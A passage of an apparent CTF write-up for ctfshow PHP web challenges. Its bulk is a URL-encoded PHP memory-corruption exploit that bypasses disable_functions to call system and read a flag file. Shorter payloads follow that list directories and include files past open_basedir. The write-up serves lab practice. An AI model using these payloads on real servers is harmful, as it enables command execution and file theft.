class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">61</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">45</span>%<span class="hljs-number">4</span>c%<span class="hljs-number">46</span>%<span class="hljs-number">20</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">64</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">64</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">64</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">62</span>%<span class="hljs-number">29</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">77</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">64</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b<br></code></pre></td></tr></table></figure><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p><code>c=var_export(scandir(&#39;/&#39;));exit();</code>   这次没有貌似<code>open_basedir</code><br><code>c=include(&#39;/flagc.txt&#39;);exit();</code></p><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>ban了<code>scandir() </code><br>还得是glob<br><code>c=var_export(glob(&quot;/*&quot;));exit();</code><br><code>c=include(&#39;/flagx.txt&#39;);exit();</code></p><h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p>ban了<code>scandir() </code><br><code>c=var_export(glob(&quot;/*&quot;));exit();</code>回显false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span 